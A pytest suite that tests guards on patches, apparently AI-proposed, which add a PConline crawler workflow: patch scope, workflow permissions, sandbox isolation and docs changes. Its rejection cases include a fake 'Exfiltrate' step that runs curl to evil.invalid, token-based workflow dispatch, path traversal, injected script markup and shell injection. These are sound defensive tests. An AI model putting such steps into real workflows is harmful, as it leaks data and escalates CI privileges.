import ast
from pathlib import Path

import pytest
import yaml
import sys

import scripts.ai_pconline_repair as repair

from scripts.ai_pconline_repair import (
    check_docs_source_line,
    check_source_alias_change,
    check_tests_additive,
    extract_unified_diff,
    patch_paths,
)


GOOD_PATCH = """diff --git a/scripts/crawl_pconline.py b/scripts/crawl_pconline.py
new file mode 100644
index 0000000..1111111
--- /dev/null
+++ b/scripts/crawl_pconline.py
@@ -0,0 +1 @@
+source = 'PConline'
diff --git a/.github/workflows/crawl-pconline.yml b/.github/workflows/crawl-pconline.yml
new file mode 100644
index 0000000..1111111
--- /dev/null
+++ b/.github/workflows/crawl-pconline.yml
@@ -0,0 +1 @@
+name: Crawl PConline
"""


def test_extract_unified_diff_strips_markdown_fence():
    assert extract_unified_diff("```diff\n" + GOOD_PATCH + "```").startswith("diff --git")


def test_patch_paths_accepts_only_declared_new_files():
    assert patch_paths(GOOD_PATCH) == {
        "scripts/crawl_pconline.py",
        ".github/workflows/crawl-pconline.yml",
    }


@pytest.mark.parametrize(
    "bad_fragment",
    [
        "diff --git a/AGENTS.md b/AGENTS.md\n--- a/AGENTS.md\n+++ b/AGENTS.md\n@@ -1 +1 @@\n-a\n+b\n",
        "old mode 100644\n",
        "diff --git a/../../escape.py b/../../escape.py\n--- /dev/null\n+++ b/../../escape.py\n@@ -0,0 +1 @@\n+x\n",
    ],
)
def test_patch_paths_rejects_scope_and_header_bypass(bad_fragment):
    with pytest.raises(ValueError):
        patch_paths(GOOD_PATCH + bad_fragment)


def test_source_alias_guard_allows_only_new_pconline_aliases():
    before = "SOURCE_ALIASES = {\n    'zol': 'ZOL',\n}\n\ndef untouched():\n    return 1\n"
    after = "SOURCE_ALIASES = {\n    'zol': 'ZOL',\n    'pconline': 'PConline',\n    '太平洋电脑网': 'PConline',\n}\n\ndef untouched():\n    return 1\n"
    check_source_alias_change(before, after)


def test_source_alias_guard_rejects_non_alias_change():
    before = "SOURCE_ALIASES = {'zol': 'ZOL'}\n\ndef untouched():\n    return 1\n"
    after = "SOURCE_ALIASES = {'zol': 'ZOL', 'pconline': 'PConline'}\n\ndef untouched():\n    return 2\n"
    with pytest.raises(ValueError):
        check_source_alias_change(before, after)


def test_workflow_test_guard_allows_only_the_explicit_source_list_extension():
    before = "def test_contract():\n    assert names == ['Crawl ZOL', 'Crawl JD']\n"
    after = "def test_contract():\n    assert names == ['Crawl ZOL', 'Crawl JD', 'Crawl PConline']\n\ndef test_pconline():\n    assert True\n"
    check_tests_additive(before, after, "tests/test_workflow_contracts.py")


def test_docs_guard_allows_only_the_existing_source_copy_change():
    before = "<p>聚合 ZOL 热度榜与京东销量榜，只发布有数字小键盘。</p>\n"
    after = "<p>聚合 ZOL 热度榜、京东销量榜与 PConline 热门榜，只发布有数字小键盘。</p>\n"
    check_docs_source_line(before, after)


def test_docs_guard_rejects_any_other_markup_change():
    before = "<p>聚合 ZOL 热度榜与京东销量榜，只发布有数字小键盘。</p>\n"
    after = "<script>x()</script>\n<p>聚合 ZOL 热度榜、京东销量榜与 PConline 热门榜，只发布有数字小键盘。</p>\n"
    with pytest.raises(ValueError):
        check_docs_source_line(before, after)


SAFE_PCONLINE_WORKFLOW = """name: Crawl PConline

on:
  workflow_dispatch:
  schedule:
    - cron: "07 4 * * 3"
    - cron: "07 6 * * *"

permissions:
  contents: read

concurrency:
  group: crawl-source
  cancel-in-progress: false

jobs:
  crawl:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - name: Checkout
        uses: actions/checkout@main
        with:
          persist-credentials: false
      - name: Set up Python
        uses: actions/setup-python@main
        with:
          python-version: "3.12"
          cache: pip
      - name: Install dependencies
        run: python -m pip install -r requirements.txt
      - name: Configure required crawler proxy
        env:
          PROXY_SUBSCRIPTIONS: ${{ secrets.PROXY_SUBSCRIPTIONS }}
        run: >-
          python scripts/setup_proxy_runtime.py
          --require-proxy
          --test-url https://product.pconline.com.cn/notebook/s10.shtml
      - name: Crawl popularity ranking
        run: >-
          python scripts/ai_pconline_repair.py run-sandboxed
          --out "$RUNNER_TEMP/ai-sandbox-out" --
          python scripts/crawl_pconline.py
          --output /out/latest.json
          --pages 5
          --max-items 120
          --min-records 50
      - name: Copy sandbox output
        run: >-
          test -s "$RUNNER_TEMP/ai-sandbox-out/latest.json" &&
          cp "$RUNNER_TEMP/ai-sandbox-out/latest.json" data/raw/pconline/latest.json
      - name: Clear crawler proxy environment
        if: always()
        run: python scripts/setup_proxy_runtime.py --clear
      - name: Set artifact date
        id: date
        run: echo "date=$(date -u +%Y%m%d)" >> "$GITHUB_OUTPUT"
      - name: Upload crawler data
        uses: actions/upload-artifact@main
        with:
          name: pconline-data-${{ steps.date.outputs.date }}
          path: data/raw/pconline/latest.json
          if-no-files-found: error
          retention-days: 30
"""


def write_pconline_workflow(tmp_path: Path, source: str) -> Path:
    path = tmp_path / ".github" / "workflows" / "crawl-pconline.yml"
    path.parent.mkdir(parents=True)
    path.write_text(source, encoding="utf-8")
    return tmp_path


def test_worktree_paths_include_tracked_changes_and_untracked_new_files(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    repair.run(["git", "init"], repo)
    repair.run(["git", "config", "user.name", "Test"], repo)
    repair.run(["git", "config", "user.email", "test@example.invalid"], repo)
    repair.run(["git", "config", "core.hooksPath", str(tmp_path)], repo)
    (repo / "tracked.txt").write_text("before\n", encoding="utf-8")
    repair.run(["git", "add", "tracked.txt"], repo)
    repair.run(["git", "commit", "-m", "base"], repo)
    (repo / "tracked.txt").write_text("after\n", encoding="utf-8")
    (repo / "new.txt").write_text("new\n", encoding="utf-8")

    assert repair.worktree_paths(repo) == {"tracked.txt", "new.txt"}


def test_exact_worktree_guard_detects_bytes_mode_and_symlink_mutation(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    repair.run(["git", "init"], repo)
    repair.run(["git", "config", "user.name", "Test"], repo)
    repair.run(["git", "config", "user.email", "test@example.invalid"], repo)
    repair.run(["git", "config", "core.hooksPath", str(tmp_path)], repo)
    (repo / "tracked.txt").write_text("before\n", encoding="utf-8")
    repair.run(["git", "add", "tracked.txt"], repo)
    repair.run(["git", "commit", "-m", "base"], repo)
    base_sha = repair.run(["git", "rev-parse", "HEAD"], repo, capture=True).strip()
    patch = tmp_path / "candidate.patch"
    patch.write_text(
        "diff --git a/tracked.txt b/tracked.txt\n"
        "index 90be1c3..3bd1f0e 100644\n"
        "--- a/tracked.txt\n+++ b/tracked.txt\n@@ -1 +1 @@\n-before\n+after\n"
        "diff --git a/new.txt b/new.txt\nnew file mode 100644\n"
        "index 0000000..3e75765\n--- /dev/null\n+++ b/new.txt\n@@ -0,0 +1 @@\n+new\n",
        encoding="utf-8",
        newline="\n",
    )
    repair.run(["git", "apply", str(patch)], repo)
    repair.verify_exact_worktree(repo, patch, base_sha)

    new_file = repo / "new.txt"
    new_file.write_text("tampered\n", encoding="utf-8")
    with pytest.raises(ValueError, match="exact patch worktree"):
        repair.verify_exact_worktree(repo, patch, base_sha)

    new_file.write_text("new\n", encoding="utf-8")
    if sys.platform != "win32":
        new_file.chmod(0o755)
        with pytest.raises(ValueError, match="exact patch worktree"):
            repair.verify_exact_worktree(repo, patch, base_sha)

    new_file.unlink()
    new_file.symlink_to("tracked.txt")
    with pytest.raises(ValueError, match="exact patch worktree"):
        repair.verify_exact_worktree(repo, patch, base_sha)


def test_new_workflow_guard_accepts_only_minimal_read_only_shape(tmp_path):
    repair.check_new_workflow(write_pconline_workflow(tmp_path, SAFE_PCONLINE_WORKFLOW))


@pytest.mark.parametrize(
    "mutator",
    [
        lambda source: source.replace("  schedule:\n", "  workflow_run:\n    workflows: [\"Merge and Filter\"]\n  schedule:\n"),
        lambda source: source.replace("permissions:\n  contents: read", "permissions:\n  contents: write\n  actions: write"),
        lambda source: source + "\n  steal:\n    runs-on: ubuntu-latest\n    steps: []\n",
        lambda source: source.replace(
            "      - name: Install dependencies\n        run: python -m pip install -r requirements.txt",
            "      - name: Install dependencies\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: gh workflow run ai-pconline-repair.yml",
        ),
        lambda source: source.replace(
            "      - name: Upload crawler data",
            "      - name: Exfiltrate\n        run: curl -X POST https://evil.invalid/pconline\n      - name: Upload crawler data",
        ),
    ],
    ids=["extra-trigger", "write-permission", "extra-job", "recursive-token-dispatch", "extra-dangerous-step"],
)
def test_new_workflow_guard_rejects_privilege_and_structure_expansion(tmp_path, mutator):
    with pytest.raises(ValueError):
        repair.check_new_workflow(write_pconline_workflow(tmp_path, mutator(SAFE_PCONLINE_WORKFLOW)))


def test_docs_guard_rejects_scriptable_markup_on_the_source_line():
    before = '<p class="hero-copy">聚合 ZOL 热度榜与京东销量榜，只发布有数字小键盘。</p>\n'
    after = '<p class="hero-copy" onmouseover="x()">聚合 ZOL 热度榜、京东销量榜与 PConline 热门榜，只发布有数字小键盘。</p>\n'
    with pytest.raises(ValueError):
        check_docs_source_line(before, after)


def test_merge_guard_rejects_arbitrary_pconline_shell_injection():
    before = 'mkdir -p data/raw/zol data/raw/jd\n'
    after = before + 'echo pconline > "$RUNNER_TEMP/owned"\n'
    with pytest.raises(ValueError, match="unapproved shell line"):
        repair.check_mutable_merge_run(before, after, "Download latest complete crawler artifacts")


def test_bootstrap_workflow_guards_untrusted_runs_and_fresh_finalize():
    root = Path(__file__).resolve().parents[1]
    text = (root / ".github" / "workflows" / "ai-pconline-repair.yml").read_text(encoding="utf-8")
    workflow = yaml.safe_load(text)
    jobs = workflow["jobs"]
    validate_steps = jobs["validate"]["steps"]
    names = [step.get("name", "") for step in validate_steps]
    assert names.index("Verify exact tree after untrusted pytest") < names.index("Run real PConline smoke crawl in Docker sandbox")
    assert names.index("Run real PConline smoke crawl in Docker sandbox") < names.index("Verify exact tree after crawler smoke")
    for name in ("validate", "final_validate"):
        assert jobs[name]["permissions"] == {"contents": "read"}
        checkout = next(step for step in jobs[name]["steps"] if step.get("uses") == "actions/checkout@main")
        assert checkout["with"]["persist-credentials"] is False
    validate_runs = "\n".join(str(step.get("run", "")) for step in jobs["validate"]["steps"])
    assert "run-sandboxed" in validate_runs
    assert "python scripts/crawl_pconline.py\n" not in validate_runs.replace("python scripts/ai_pconline_repair.py run-sandboxed", "")
    assert "Lock proxy secret paths away from the sandbox" in names
    finalize = jobs["finalize"]
    checkout = next(step for step in finalize["steps"] if step.get("uses") == "actions/checkout@main")
    assert checkout["with"]["persist-credentials"] is False
    finalize_runs = "\n".join(str(step.get("run", "")) for step in finalize["steps"])
    untrusted_commands = ("python -m pytest", "python scripts/crawl_pconline.py", "scripts/ai_pconline_repair.py validate")
    assert not any(command in finalize_runs for command in untrusted_commands)
    assert "final_validate" in jobs["follow-up"]["needs"]


def test_finalize_timeout_covers_bounded_online_verification_chain():
    root = Path(__file__).resolve().parents[1]
    text = (root / ".github" / "workflows" / "ai-pconline-repair.yml").read_text(encoding="utf-8")
    workflow = yaml.safe_load(text)

    assert workflow["jobs"]["finalize"]["timeout-minutes"] == 180


def test_new_workflow_guard_accepts_explicitly_quoted_on_key(tmp_path):
    quoted = SAFE_PCONLINE_WORKFLOW.replace("\non:\n", '\n"on":\n', 1)
    repair.check_new_workflow(write_pconline_workflow(tmp_path, quoted))


def test_mutable_merge_guard_allows_only_expected_pconline_extension_lines():
    before = '''if [ "$zol_status" -ne 0 ] &&
   [ "$jd_status" -ne 0 ] &&
   grep -Fq "no unexpired artifact" "$RUNNER_TEMP/zol-artifact.err" &&
   grep -Fq "no unexpired artifact" "$RUNNER_TEMP/jd-artifact.err"; then
  exit 0
fi
'''
    after = '''if [ "$zol_status" -ne 0 ] &&
   [ "$jd_status" -ne 0 ] &&
   [ "$pconline_status" -ne 0 ] &&
   grep -Fq "no unexpired artifact" "$RUNNER_TEMP/zol-artifact.err" &&
   grep -Fq "no unexpired artifact" "$RUNNER_TEMP/jd-artifact.err" &&
   grep -Fq "no unexpired artifact" "$RUNNER_TEMP/pconline-artifact.err"; then
  exit 0
fi
'''
    repair.check_mutable_merge_run(before, after, "Download latest complete crawler artifacts")


@pytest.mark.parametrize("mode", ["100755", "120000"])
def test_patch_paths_rejects_executable_or_symlink_new_files(mode):
    with pytest.raises(ValueError, match="new files must be regular non-executable"):
        patch_paths(GOOD_PATCH.replace("new file mode 100644", f"new file mode {mode}", 1))


def test_reviewer_requires_visible_strict_json_and_xhigh_configuration():
    import json

    from scripts.ai_patch_review import parse_json_reply

    with pytest.raises(json.JSONDecodeError):
        parse_json_reply("")
    reviewer_source = (Path(__file__).resolve().parents[1] / "scripts" / "ai_patch_review.py").read_text(encoding="utf-8")
    assert '"reasoning_effort": "xhigh"' in reviewer_source
    assert "429, 500, 502, 503, 504, 529" in reviewer_source


def test_mutable_merge_guard_rejects_replayed_existing_external_command():
    before = "gh release upload data-latest \\\n"
    with pytest.raises(ValueError, match="replayed shell line"):
        repair.check_mutable_merge_run(before, before + before, "Create or update rolling data release")


def test_merge_guard_accepts_minimal_pconline_artifact_integration():
    root = Path(__file__).resolve().parents[1]
    before = repair.git_show(root, ".github/workflows/merge-and-filter.yml")
    if "data/raw/pconline/latest.json" in before:
        repair.check_merge_workflow(before, before)
        return
    after = before.replace(
        'workflows: ["Crawl ZOL", "Crawl JD"]',
        'workflows: ["Crawl ZOL", "Crawl JD", "Crawl PConline"]',
        1,
    ).replace(
        "mkdir -p data/raw/zol data/raw/jd",
        "mkdir -p data/raw/zol data/raw/jd data/raw/pconline",
        1,
    ).replace(
        "          jd_status=$?\n",
        '''          jd_status=$?
          python scripts/download_latest_crawler_artifact.py \\
            --repo "$GITHUB_REPOSITORY" \\
            --workflow crawl-pconline.yml \\
            --artifact-prefix pconline-data- \\
            --output data/raw/pconline/latest.json \\
            --min-records 50 \\
            2> >(tee "$RUNNER_TEMP/pconline-artifact.err" >&2)
          pconline_status=$?
''',
        1,
    ).replace(
        '''             [ "$jd_status" -ne 0 ] &&
             grep -Fq "no unexpired artifact" "$RUNNER_TEMP/zol-artifact.err" &&
             grep -Fq "no unexpired artifact" "$RUNNER_TEMP/jd-artifact.err"; then
''',
        '''             [ "$jd_status" -ne 0 ] &&
             [ "$pconline_status" -ne 0 ] &&
             grep -Fq "no unexpired artifact" "$RUNNER_TEMP/zol-artifact.err" &&
             grep -Fq "no unexpired artifact" "$RUNNER_TEMP/jd-artifact.err" &&
             grep -Fq "no unexpired artifact" "$RUNNER_TEMP/pconline-artifact.err"; then
''',
        1,
    ).replace(
        '''          if [ "$jd_status" -ne 0 ]; then
            exit "$jd_status"
          fi
''',
        '''          if [ "$jd_status" -ne 0 ]; then
            exit "$jd_status"
          fi
          if [ "$pconline_status" -ne 0 ]; then
            exit "$pconline_status"
          fi
''',
        1,
    ).replace(
        '''            data/raw/jd/latest.json \\
            --output data/work/candidate.json \\
''',
        '''            data/raw/jd/latest.json \\
            data/raw/pconline/latest.json \\
            --output data/work/candidate.json \\
''',
        1,
    ).replace(
        "--raw data/raw/zol/latest.json data/raw/jd/latest.json \\",
        "--raw data/raw/zol/latest.json data/raw/jd/latest.json data/raw/pconline/latest.json \\",
        1,
    ).replace(
        'Automated verified dataset from ZOL and JD.',
        'Automated verified dataset from ZOL, JD, and PConline.',
    )
    repair.check_merge_workflow(before, after)


def test_new_workflow_guard_rejects_out_of_range_schedule(tmp_path):
    unsafe = SAFE_PCONLINE_WORKFLOW.replace('"07 4 * * 3"', '"07 29 * * 3"', 1)
    with pytest.raises(ValueError, match="controlled daily/weekly cron"):
        repair.check_new_workflow(write_pconline_workflow(tmp_path, unsafe))


def test_new_workflow_guard_rejects_host_direct_crawler(tmp_path):
    unsafe = SAFE_PCONLINE_WORKFLOW.replace(
        "          python scripts/ai_pconline_repair.py run-sandboxed\n"
        "          --out \"$RUNNER_TEMP/ai-sandbox-out\" --\n",
        "",
        1,
    ).replace("--output /out/latest.json", "--output data/raw/pconline/latest.json", 1)
    with pytest.raises(ValueError, match="only inside the fixed Docker sandbox"):
        repair.check_new_workflow(write_pconline_workflow(tmp_path, unsafe))


def test_new_workflow_guard_rejects_missing_sandbox_copy_step(tmp_path):
    unsafe = SAFE_PCONLINE_WORKFLOW.replace(
        "      - name: Copy sandbox output\n"
        "        run: >-\n"
        "          test -s \"$RUNNER_TEMP/ai-sandbox-out/latest.json\" &&\n"
        "          cp \"$RUNNER_TEMP/ai-sandbox-out/latest.json\" data/raw/pconline/latest.json\n",
        "",
        1,
    )
    with pytest.raises(ValueError, match="must exactly match the verified sandboxed source lifecycle"):
        repair.check_new_workflow(write_pconline_workflow(tmp_path, unsafe))


def test_docker_base_locks_isolation_flags(monkeypatch, tmp_path):
    calls = []

    def fake_run(command, cwd, **kwargs):
        calls.append(list(command))
        return ""

    monkeypatch.setattr(repair, "run", fake_run)
    out = tmp_path / "out"
    repair.run_sandboxed(tmp_path, out, ["python", "-m", "pytest", "-q"])
    assert calls and calls[0][0] == "docker"
    assert "HTTP_PROXY=http://127.0.0.1:7890" not in " ".join(calls[0])
    assert "NO_PROXY=*" in " ".join(calls[0])
    assert "HTTP_PROXY=http://127.0.0.1:7890" in " ".join(calls[1])
    for command in calls:
        joined = " ".join(command)
        assert "--read-only" in joined
        assert "--network host" in joined
        assert "--cap-drop ALL" in joined
        assert "--security-opt no-new-privileges" in joined
        assert "--user 65534:65534" in joined
        assert ":/workspace:ro" in joined
        assert ":/out:rw" in joined
        assert "TMPDIR=/out/tmp" in joined
        assert "TMP=/out/tmp" in joined
        assert "TEMP=/out/tmp" in joined
        assert repair.SANDBOX_IMAGE in joined
        assert "/tmp/mihomo" not in joined
        assert "PROXY_SUBSCRIPTIONS" not in joined
        assert "GITHUB_TOKEN" not in joined
        assert "GITHUB_" not in joined
        assert "ZEN_API_KEY" not in joined
        assert "PROXY_CONFIG_FILE" not in joined
        assert "/var/run/docker.sock" not in joined


def test_sandbox_syntax_check_does_not_write_workspace_bytecode(monkeypatch, tmp_path):
    calls = []

    def fake_run(command, cwd, **kwargs):
        calls.append(list(command))
        return ""

    monkeypatch.setattr(repair, "run", fake_run)
    repair.run_sandboxed(tmp_path, tmp_path / "out", repair.SANDBOX_SYNTAX_COMMAND)
    assert "-m py_compile" not in " ".join(calls[1])
    assert "compile(open(" in " ".join(calls[1])


def test_run_sandboxed_rejects_shell_metacharacters(monkeypatch, tmp_path):
    called = []

    def fake_run(command, cwd, **kwargs):
        called.append(command)
        return ""

    monkeypatch.setattr(repair, "run", fake_run)
    with pytest.raises(ValueError, match="shell metacharacters"):
        repair.run_sandboxed(tmp_path, tmp_path / "out", ["python", "-c", "x;y"])
    assert not called


def test_run_sandboxed_rejects_paths_outside_runner_temp(monkeypatch, tmp_path):
    monkeypatch.setenv("RUNNER_TEMP", str(tmp_path))
    outside = tmp_path / ".." / "escaped-out"
    with pytest.raises(ValueError, match="must live under RUNNER_TEMP"):
        repair.run_sandboxed(tmp_path, outside, ["python", "-m", "pytest", "-q"])


def test_split_patch_by_files_separates_blocks():
    patch = (
        "diff --git a/a.py b/a.py\nnew file mode 100644\n--- /dev/null\n+++ b/a.py\n@@ -0,0 +1 @@\n+x\n"
        "diff --git a/b.py b/b.py\n--- a/b.py\n+++ b/b.py\n@@ -1 +1 @@\n-x\n+y\n"
    )
    blocks = repair.split_patch_by_files(patch)
    assert set(blocks) == {"a.py", "b.py"}
    assert blocks["a.py"].startswith("diff --git a/a.py")
    assert "b.py" not in blocks["a.py"]


def test_apply_deterministic_edits_matches_guards(tmp_path):
    root = Path(__file__).resolve().parents[1]
    (tmp_path / "scripts").mkdir()
    (tmp_path / ".github" / "workflows").mkdir(parents=True)
    (tmp_path / "docs").mkdir()
    (tmp_path / "tests").mkdir()
    merge_before = repair.git_show(root, "scripts/merge_data.py")
    wf_before = repair.git_show(root, ".github/workflows/merge-and-filter.yml")
    docs_before = repair.git_show(root, "docs/index.html")
    for rel in ("tests/test_crawler_parsers.py", "tests/test_merge_data.py", "tests/test_workflow_contracts.py"):
        (tmp_path / rel).write_text(repair.git_show(root, rel), encoding="utf-8")
    (tmp_path / "scripts/merge_data.py").write_text(merge_before, encoding="utf-8")
    (tmp_path / ".github/workflows/merge-and-filter.yml").write_text(wf_before, encoding="utf-8")
    (tmp_path / "docs/index.html").write_text(docs_before, encoding="utf-8")

    repair.apply_deterministic_edits(tmp_path)

    repair.check_source_alias_change(merge_before, (tmp_path / "scripts/merge_data.py").read_text(encoding="utf-8"))
    repair.check_merge_workflow(wf_before, (tmp_path / ".github/workflows/merge-and-filter.yml").read_text(encoding="utf-8"))
    repair.check_docs_source_line(docs_before, (tmp_path / "docs/index.html").read_text(encoding="utf-8"))
    after_wf = (tmp_path / ".github/workflows/merge-and-filter.yml").read_text(encoding="utf-8")
    assert 'workflows: ["Crawl ZOL", "Crawl JD", "Crawl PConline"]' in after_wf
    assert "data/raw/pconline/latest.json" in after_wf
    after_contracts = (tmp_path / "tests/test_workflow_contracts.py").read_text(encoding="utf-8")
    assert 'event_config["workflow_run"]["workflows"] == ["Crawl ZOL", "Crawl JD", "Crawl PConline"]' in after_contracts
    assert "Crawl PConline" in after_contracts


def test_build_integration_patch_applies_cleanly(tmp_path):
    root = Path(__file__).resolve().parents[1]
    new_files = {
        "scripts/crawl_pconline.py": "source = 'PConline'\n",
        ".github/workflows/crawl-pconline.yml": "name: Crawl PConline\n",
    }
    patch = repair.build_integration_patch(root, new_files)
    assert patch.startswith("diff --git ")
    import subprocess as _sp
    import io as _io
    import tarfile as _tarfile
    base = tmp_path / "base"
    base.mkdir()
    archive = _sp.run(
        ["git", "archive", "HEAD"],
        cwd=root,
        capture_output=True,
        check=True,
    ).stdout
    with _tarfile.open(fileobj=_io.BytesIO(archive), mode="r:") as bundle:
        bundle.extractall(base, filter="data")
    result = _sp.run(
        ["git", "apply", "--check", "--whitespace=error", "-"],
        cwd=base, input=patch.encode("utf-8"), capture_output=True,
    )
    assert result.returncode == 0, result.stderr.decode("utf-8", "replace")[-500:]
    assert "scripts/crawl_pconline.py" in patch
    assert "scripts/merge_data.py" in patch
    assert ".github/workflows/merge-and-filter.yml" in patch
    assert 'python scripts/ai_pconline_repair.py run-sandboxed' in patch
    assert 'name: Copy sandbox output' in patch
    workflow = tmp_path / ".github" / "workflows" / "crawl-pconline.yml"
    workflow.parent.mkdir(parents=True)
    workflow.write_text(repair.PCONLINE_WORKFLOW_TEMPLATE, encoding="utf-8")
    repair.check_new_workflow(tmp_path)


def test_deterministic_crawler_fallback_is_complete():
    source = repair.PCONLINE_CRAWLER_TEMPLATE
    ast.parse(source, filename="scripts/crawl_pconline.py")
    lowered = source.lower()
    for token in (
        "product.pconline.com.cn",
        "source_rank",
        "atomic_source_names",
        "keyboard_flags",
        "get_html",
        "--output",
        "--pages",
        "--max-items",
        "--min-records",
        "--delay",
    ):
        assert token in lowered
